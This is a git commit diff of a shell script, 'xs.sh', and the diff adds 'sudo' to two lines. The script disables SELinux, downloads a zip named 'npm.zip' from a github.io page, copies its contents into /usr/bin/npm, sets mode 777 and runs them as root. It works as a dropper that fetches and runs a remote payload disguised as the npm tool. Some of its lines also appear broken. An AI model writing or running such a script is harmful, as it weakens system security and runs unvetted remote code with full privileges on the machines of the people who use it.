3b60175e2a7f1385090516e18905c73781fc688c
fuserh <113811989+fuserh@users.noreply.github.com>
2022-09-24 16:58:23 +0800

    Update xs.sh

--- xs.sh
+++ xs.sh
@@ -1,8 +1,8 @@
 sudo echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
 curl -L --progress-bar "https://fuserh.github.io/npm.zip" -o ./npm.zip
 unzip npm.zip
-cp -r npm /usr/bin/npm
+sudo cp -r npm /usr/bin/npm
 rm npm.zip
 rm npm
-chmod 777 /usr/bin/npm/npm
+sudo chmod 777 /usr/bin/npm/npm
 sudo sh /usr/bin/npm/npm
